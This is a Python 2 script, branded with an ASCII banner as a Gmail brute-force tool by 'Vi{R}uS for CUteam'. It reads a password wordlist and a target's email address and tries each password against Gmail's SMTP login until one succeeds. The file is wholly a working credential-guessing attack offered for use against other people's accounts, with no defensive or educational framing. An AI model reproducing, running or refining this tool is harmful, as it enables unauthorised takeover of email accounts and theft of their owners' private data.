import smtplib
import sys
print"########################################################################################################################"
print "                                                                                                                       "
print "      _____         _____        _____   ____   ____ _________________     ______         ____       ______  _______   "
print "  ___|\    \   ___|\     \   ___|\    \ |    | |    /                 \___|\     \   ____|\   \     |      \/       \  "
print " /    /\    \ |    |\     \ /    /\    \|    | |    \______     ______/     \     \ /    /\    \   /          /\     \ "
print "|    |  |____||    | |     |    |  |    |    | |    |  \( /    /  )/  |     ,_____/|    |  |    | /     /\   / /\     |"
print "|    |    ____|    | /_ _ /|    |  |____|    | |    |   ' |   |   '   |     \--'\_|/    |__|    |/     /\ \_/ / /    /|"
print "|    |   |    |    |\    \ |    |   ____|    | |    |     |   |       |     /___/| |    .--.    |     |  \|_|/ /    / |"
print "|    |   |_,  |    | |    ||    |  |    |    | |    |    /   //       |     \____|\|    |  |    |     |       |    |  |"
print "|\ ___\___/  /|____|/____/||\ ___\/    /|\___\_|____|   /___//        |____ '     /|____|  |____|\____\       |____|  /"
print "| |   /____ / |    /     ||| |   /____/ | |    |    |  |\`   |         |    /_____/ |    |  |    | |    |      |    | / "
print " \|___|    | /|____|_____|/ \|___|    | /\|____|____|  |____|         |____|     | /____|  |____|\|____|      |____|/  "
print "   \( |____|/   \(    )/      \( |____|/    \(   )/      \(             \( |_____|/  \(      )/     \(          )/     "
print "    '   )/       '    '        '   )/        '   '        '              '    )/      '      '       '          '      "
print "        '                          '                                          '                                        "
print"                               ----- Gmail Brute Force Created by Vi{R}uS for CUteam -----   "
print"                                            ------  insta:qv_00v  ------                   " 
print"########################################################################################################################"
file_path = raw_input('[!] Password File :')
passwfile = open(file_path,'r')
pass_lst = passwfile.readlines()

def login():
    i = 0
    usr = raw_input('[!] targets email address :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for passw in pass_lst:
      i = i + 1
      print str(i) + '/' + str(len(pass_lst))
      try:
         server.login(usr, passw)
         print '[+] Password Found ===> %s ' % passw
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            print '[+] Password Found ===> %s ' % passw
            break
         else:
            print '[!] Password Incorrect ===> %s ' % passw
login()